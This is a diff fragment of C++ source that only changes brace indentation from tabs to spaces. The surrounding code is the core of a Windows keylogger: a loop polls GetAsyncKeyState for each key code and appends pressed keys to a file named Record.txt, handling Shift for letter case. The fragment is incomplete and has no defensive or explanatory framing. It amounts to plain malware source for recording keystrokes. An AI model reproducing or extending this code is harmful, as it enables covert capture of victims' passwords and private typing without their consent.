@@ -15,11 +15,11 @@ void StartLogging()
 {
     char c;
     for(;;)
-	{
+    {
     for(c=8;c<=222;c++)
-	{
+    {
     if(GetAsyncKeyState(c)==-32767)
-	{
+    {
     ofstream write("Record.txt", ios::app);
     if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)) )
     {
@@ -35,7 +35,7 @@ void StartLogging()
     break;
     }
     else 
-	{
+    {
     switch (c)
     {
     case 48:
